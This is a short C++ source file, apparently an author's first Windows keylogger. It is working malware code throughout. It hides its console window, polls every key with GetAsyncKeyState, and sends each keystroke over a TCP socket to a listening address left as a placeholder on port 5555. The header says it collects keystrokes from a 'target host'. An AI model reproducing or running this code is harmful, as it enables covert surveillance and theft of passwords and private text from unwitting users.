// Jose E. Rodriguez (aka vectorNull)
// June 9, 2021
// jose@vectornullsec.com
// This is my first attempt at a keylogger program in C++. This is meant to run on Windows. Collects the user's keystrokes and sends them back via a network to an address of choice. 

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main () {

    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hides programming window
    char KEY;
    WSADATA WSAData; // Will hold Windows socket data
    SOCKET server; // Stores connection of type SOCKET
    SOCKADDR_IN addr; // Connections details
    
    WSAStartup(MAKEWORD(2, 0), &WSAData); // initialize winsock library
    server = socket(AF_INET, SOCK_STREAM, 0); // setup of TCP socket
    addr.sin_addr.s_addr = inet_addr("LISTENING ADDRESS - ADD HERE");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); // Listening port - replace with your chosen port number
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // The following code is responsible for collecting any pressed keys on target host.

    while (true) {
        Sleep(10); 
        // checks if key is printable (Microsoft defined)
        for (int KEY = 0x8; KEY < 0xFF; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }


    }

    closesocket(server);
    WSACleanup(); // Clean up Winsock
}

